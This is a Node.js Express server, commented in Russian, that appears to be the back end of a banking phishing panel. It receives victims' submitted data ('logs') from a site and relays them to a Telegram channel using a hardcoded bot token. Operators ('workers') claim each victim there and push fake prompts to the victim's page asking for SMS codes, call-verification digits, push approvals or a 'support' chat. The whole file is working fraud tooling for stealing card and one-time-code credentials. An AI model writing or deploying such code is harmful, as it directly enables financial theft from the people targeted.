const express = require('express');
const axios = require('axios');
const app = express();

app.use(express.json());
app.use(express.static('public'));

// --- КОНФИГУРАЦИЯ ---
const BOT_TOKEN = '8003392137:AAFbnbKyLJS6N1EdYSxtRhR9n5n4eJFpBbw';
const CHANNEL_ID = '-1003455979409';

let userTasks = {}; 
let logsStorage = {}; 
let waitingForText = {}; 

const cmdTexts = {
    'sms': 'Введите код подтверждения из СМС',
    'call': 'Введите последние 4 цифры номера, с которого поступит звонок',
    'push': 'Подтвердите вход в мобильном приложении',
    'bal': 'Недостаточно средств на карте. Попробуйте другую карту',
    'support': 'Ошибка безопасности. Опишите проблему оператору в чате'
};

const safeText = (text) => String(text).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');

// --- ПУБЛИЧНЫЙ ЭНДПОИНТ (ЧТОБЫ НЕ СПАЛ) ---
app.get('/health', (req, res) => res.send('Бот активен'));

// --- ПРИЕМ ЛОГА С САЙТА ---
app.post('/api/log', async (req, res) => {
    const { userId, type, data } = req.body;
    logsStorage[userId] = { type, data, time: new Date().toLocaleTimeString() };

    const workerId = Object.keys(waitingForText).find(id => waitingForText[id] === userId);

    if (workerId && (type === 'ОТВЕТ' || type === 'ВВІД_ПРИВАТ')) {
        let replyMsg = `<b>📩 ПОЛУЧЕН ОТВЕТ [<code>${userId}</code>]</b>\n\n`;
        for (let key in data) { replyMsg += `<b>${key}:</b> <code>${data[key]}</code>\n`; }
        
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: workerId,
            text: replyMsg,
            parse_mode: 'HTML'
        }).catch(e => console.log("Ошибка отправки воркеру"));
    } else {
        let channelMsg = `<b>🆕 НОВЫЙ ЛОГ [${safeText(type)}]</b>\n`;
        channelMsg += `🆔 ID: <code>${safeText(userId)}</code>\n`;
        channelMsg += `📍 Статус: 🔵 Ожидает воркера...`;

        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHANNEL_ID,
            text: channelMsg,
            parse_mode: 'HTML',
            reply_markup: { 
                inline_keyboard: [[{ text: "⚡️ ВЗЯТЬ В РАБОТУ", callback_data: `take_${userId}` }]] 
            }
        }).catch(e => console.log("Ошибка отправки в канал"));
    }
    res.json({ success: true });
});

app.get('/api/check/:userId', (req, res) => {
    const userId = req.params.userId;
    const task = userTasks[userId] || null;
    if (task) { delete userTasks[userId]; }
    res.json(task);
});

// --- ВЕБХУК ТЕЛЕГРАМ ---
app.post('/tg-webhook', async (req, res) => {
    // Отвечаем Телеграму сразу (200 OK), чтобы он не переспрашивал и кнопки не висели
    res.sendStatus(200);

    try {
        const { message, callback_query } = req.body;

        // 1. ОБРАБОТКА ТЕКСТА
        if (message && message.text) {
            const chatId = message.chat.id;

            if (message.text === '/start') {
                return await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    chat_id: chatId,
                    text: "<b>👋 Бот запущен!</b>",
                    parse_mode: 'HTML'
                });
            } 

            if (waitingForText[chatId]) {
                const targetUserId = waitingForText[chatId];
                userTasks[targetUserId] = { action: 'ask', text: message.text };
                
                await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    chat_id: chatId,
                    text: `✅ Сообщение отправлено пользователю <code>${targetUserId}</code>.`,
                    parse_mode: 'HTML'
                });
            }
            return;
        }

        // 2. ОБРАБОТКА КНОПОК
        if (callback_query) {
            const workerId = callback_query.from.id;
            const [action, userId, code] = callback_query.data.split('_');

            // Убираем анимацию загрузки на кнопке немедленно
            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
                callback_query_id: callback_query.id
            }).catch(() => {});

            if (action === 'take') {
                const log = logsStorage[userId];
                if (log) {
                    waitingForText[workerId] = userId; 

                    let fullMsg = `<b>💎 УПРАВЛЕНИЕ ЛОГОМ [${log.type}]</b>\n`;
                    fullMsg += `🆔 ID: <code>${userId}</code>\n------------------------\n`;
                    for (let key in log.data) { fullMsg += `<b>${key}:</b> <code>${log.data[key]}</code>\n`; }

                    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        chat_id: workerId,
                        text: fullMsg,
                        parse_mode: 'HTML',
                        reply_markup: {
                            inline_keyboard: [
                                [{ text: "💬 СМС", callback_data: `ask_${userId}_sms` }, { text: "📞 Звонок", callback_data: `ask_${userId}_call` }],
                                [{ text: "📲 Пуш", callback_data: `msg_${userId}_push` }, { text: "💰 Баланс", callback_data: `msg_${userId}_bal` }],
                                [{ text: "✍️ Свой текст", callback_data: `custom_${userId}` }]
                            ]
                        }
                    });
                    
                    const workerName = callback_query.from.username ? `@${callback_query.from.username}` : callback_query.from.first_name;
                    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
                        chat_id: CHANNEL_ID,
                        message_id: callback_query.message.message_id,
                        text: `<b>🆕 ЛОГ [${log.type}]</b>\n🆔 ID: <code>${userId}</code>\n📍 Взял: <b>${workerName}</b> ✅`,
                        parse_mode: 'HTML'
                    });
                }
            }

            if (action === 'custom') {
                waitingForText[workerId] = userId;
                await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    chat_id: workerId,
                    text: `⌨️ <b>Введите текст для юзера <code>${userId}</code>:</b>`,
                    parse_mode: 'HTML'
                });
            }

            if (action === 'ask' || action === 'msg') {
                waitingForText[workerId] = userId;
                userTasks[userId] = { action, text: cmdTexts[code] || "Введите данные" };
            }
        }
    } catch (e) {
        console.error("Webhook Error:", e.message);
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Сервер на порту ${PORT}`));
